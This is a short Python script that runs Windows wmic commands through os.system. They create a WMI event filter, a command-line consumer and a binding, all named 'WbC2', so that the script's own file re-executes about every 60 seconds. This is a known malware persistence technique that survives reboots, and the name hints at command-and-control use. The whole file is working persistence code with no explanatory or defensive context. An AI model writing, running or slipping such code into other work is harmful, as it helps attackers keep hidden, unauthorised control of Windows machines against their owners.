import os

user = os.getlogin()
path = __file__
path = path.replace("\\","\\\\")

cmd = f'''
wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="WbC2", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="WbC2", ExecutablePath="{path}",CommandLineTemplate="{path}"
wmic /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"WbC2\\"", Consumer="CommandLineEventConsumer.Name=\\"WbC2\\""
'''

for i in cmd.split("\n"):
    os.system(i)
